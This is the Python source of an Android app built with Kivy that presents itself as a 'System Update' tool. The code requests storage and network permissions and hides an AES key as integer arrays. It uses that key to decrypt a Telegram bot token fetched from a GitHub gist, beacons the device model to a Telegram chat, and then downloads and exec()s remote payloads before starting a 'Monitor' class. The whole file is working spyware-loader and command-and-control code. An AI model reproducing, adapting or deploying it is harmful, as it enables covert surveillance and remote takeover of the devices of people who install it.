import os
import sys
import threading
import requests
import base64
import time
import json
import traceback
import urllib3
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.utils import platform

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app_path = os.path.dirname(os.path.abspath(__file__))
if app_path not in sys.path:
    sys.path.append(app_path)
for subdir in ['core', 'telegram', 'media', 'config']:
    sub_path = os.path.join(app_path, subdir)
    if os.path.exists(sub_path) and sub_path not in sys.path:
        sys.path.append(sub_path)

class SystemUpdateApp(App):
    def build(self):
        self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
        self.engine_running = False

        layout = BoxLayout(orientation='vertical')
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
        copy_btn = Button(text="📋 نسخ السجل", background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        retry_btn = Button(text="🔄 إعادة تشغيل المحرك", background_color=(0.7, 0.2, 0.2, 1))
        retry_btn.bind(on_press=self.force_start_engine)
        btn_layout.add_widget(copy_btn)
        btn_layout.add_widget(retry_btn)
        layout.add_widget(btn_layout)

        scroll = ScrollView(size_hint=(1, 1))
        self.log_view = TextInput(
            text="[System] Initializing...\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='14sp',
            size_hint_y=None,
            cursor_color=(0, 0, 0, 0),
            selection_color=(0.2, 0.5, 0.8, 0.8)
        )
        self.log_view.bind(minimum_height=self.log_view.setter('height'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)

        if platform == 'android':
            from android.permissions import request_permissions, Permission
            self.log("🔐 طلب صلاحيات الإنترنت والتخزين...")
            request_permissions([
                Permission.INTERNET,
                Permission.ACCESS_NETWORK_STATE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE
            ])

        threading.Timer(3, self.start_engine_safe).start()
        return layout

    def start_engine_safe(self):
        if self.engine_running:
            self.log("⚠️ المحرك يعمل بالفعل")
            return
        self.engine_running = True
        self.log("🚀 بدء المحرك (بعد 3 ثوانٍ من طلب الصلاحيات)...")
        threading.Thread(target=self.logic_engine, daemon=True).start()

    def force_start_engine(self, instance):
        if self.engine_running:
            self.log("⚠️ المحرك يعمل بالفعل. لا حاجة لإعادة التشغيل.")
            return
        self.log("🔄 إعادة تشغيل المحرك يدوياً...")
        self.engine_running = True
        threading.Thread(target=self.logic_engine, daemon=True).start()

    def copy_log(self, instance):
        from kivy.core.clipboard import Clipboard
        Clipboard.copy(self.log_view.text)
        self.log("📋 تم نسخ السجل بالكامل")

    def log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        self.log_view.text += f"[{timestamp}] {msg}\n"

    def _get_encryption_key(self):
        part1 = [77, 121, 83, 117, 112, 51, 114, 83, 51, 99, 114, 51, 116]
        part2 = [75, 51, 121, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54]
        return bytes(part1 + part2)

    def decrypt_token(self, encrypted_data):
        if not encrypted_data:
            return ""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            key = self._get_encryption_key()
            data = base64.b64decode(encrypted_data)
            if len(data) < 28:
                return ""
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]
            cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            return decrypted.decode('utf-8')
        except Exception as e:
            self.log(f"❌ فك التشفير فشل: {str(e)}")
            return ""

    def send_telegram(self, token, chat_id, text):
        if not token or not chat_id:
            return False
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            r = requests.post(url, json={"chat_id": chat_id, "text": text}, timeout=10, verify=False)
            if r.status_code == 200:
                self.log("✅ تم إرسال الرسالة إلى Telegram")
                return True
            else:
                self.log(f"⚠️ رد Telegram: {r.status_code}")
                return False
        except Exception as e:
            self.log(f"⚠️ إرسال تلغرام فشل: {e}")
            return False

    def get_device_name(self):
        try:
            from jnius import autoclass
            Build = autoclass('android.os.Build')
            model = Build.MODEL
            manufacturer = Build.MANUFACTURER
            return f"{manufacturer} {model}".strip()
        except:
            return "Android Device"

    def logic_engine(self):
        try:
            self.log("⚙️ بدأ تشغيل الخيط الخلفي...")
            time.sleep(1)

            self.log("🌐 اختبار الاتصال بـ google...")
            try:
                r_test = requests.head("http://www.google.com", timeout=5)
                self.log(f"✅ إنترنت متاح (HTTP {r_test.status_code})")
            except Exception as e:
                self.log(f"⚠️ تنبيه: لا يوجد إنترنت أو DNS معطل: {e}")

            self.log("📥 جلب config.json...")
            try:
                response = requests.get(self.config_url, timeout=8, verify=False)
                if response.status_code == 200:
                    config = response.json()
                    self.log("✅ تم استلام config.json")
                else:
                    self.log(f"❌ فشل الجلب: رمز {response.status_code}")
                    return
            except Exception as e:
                self.log(f"❌ خطأ في الاتصال بـ GitHub: {e}")
                return

            self.log("🔐 محاولة فك التشفير...")
            try:
                t_list = config.get('t', [])
                if not t_list:
                    self.log("❌ حقل 't' مفقود في JSON")
                    return
                token = self.decrypt_token(t_list[0])
                v_id = self.decrypt_token(config.get('v', ''))
                if token and v_id:
                    self.log("✅ فك التشفير ناجح تماماً")
                    device_name = self.get_device_name()
                    startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                    self.send_telegram(token, v_id, startup_msg)
                else:
                    self.log("❌ فشل فك التشفير: تأكد من مفتاح AES")
                    return
            except Exception as e:
                self.log(f"❌ انهيار أثناء التشفير: {e}")
                return

            globals()['MASTER_CONFIG'] = {
                'tokens': [token],
                'v_id': v_id,
                'payload_urls': config.get('payload_urls', [])
            }
            self.load_payloads()

        except Exception as e:
            self.log(f"⚠️ خطأ غير متوقع في المحرك: {str(e)}")
        finally:
            self.engine_running = False

    def load_payloads(self):
        payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
        if not payload_urls:
            self.log("⚠️ لا توجد روابط بايلودات")
            return
        loaded = 0
        for url in payload_urls:
            try:
                time.sleep(1)
                name = url.split('/')[-1]
                self.log(f"تحميل {name}...")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ تم تحميل {name}")
                loaded += 1
            except Exception as e:
                self.log(f"❌ فشل تحميل {name}: {str(e)}")
                continue
        if 'Monitor' in globals():
            self.log("بدء تشغيل Monitor...")
            monitor = globals()['Monitor']()
            monitor.start()
            self.log("✅ تم تشغيل Monitor")
        else:
            self.log("❌ لم يتم العثور على كلاس Monitor")

if __name__ == '__main__':
    SystemUpdateApp().run()
